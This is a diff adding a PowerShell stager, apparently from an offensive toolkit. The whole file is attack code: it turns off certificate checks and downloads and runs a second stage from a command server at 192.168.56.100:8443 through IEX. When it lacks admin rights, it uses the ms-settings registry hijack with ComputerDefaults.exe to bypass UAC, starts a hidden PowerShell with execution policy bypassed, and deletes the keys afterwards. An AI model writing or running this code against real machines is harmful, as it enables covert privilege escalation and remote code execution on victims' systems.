@@ -1,0 +1,30 @@
+function Invoke-Stage1Main {
+    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    [Net.WebRequest]::DefaultWebProxy = $null
+
+    $wc = New-Object Net.WebClient
+    $wc.Proxy = $null
+    IEX $wc.DownloadString("https://192.168.56.100:8443/stage2.ps1")
+}
+
+function Invoke-UACBypass {
+    $C2 = "https://192.168.56.100:8443"
+
+    $innerCmd = "[Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=`$null;`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;IEX `$wc.DownloadString('$C2/stage1.ps1')"
+    $elevatedCmd = "powershell.exe -NoP -W H -Exec Bypass -Command `"$innerCmd`""
+
+    try {
+        $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
+        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -EA SilentlyContinue
+        New-Item $regPath -Force | Out-Null
+        New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
+        Set-ItemProperty -Path $regPath -Name "(default)" -Value $elevatedCmd -Force
+        Start-Process "C:\Windows\System32\ComputerDefaults.exe" -WindowStyle Hidden
+        Start-Sleep -Seconds 8
+        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -EA SilentlyContinue
+    } catch {}
+}
+
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if ($isAdmin) { Invoke-Stage1Main } else { Invoke-UACBypass }
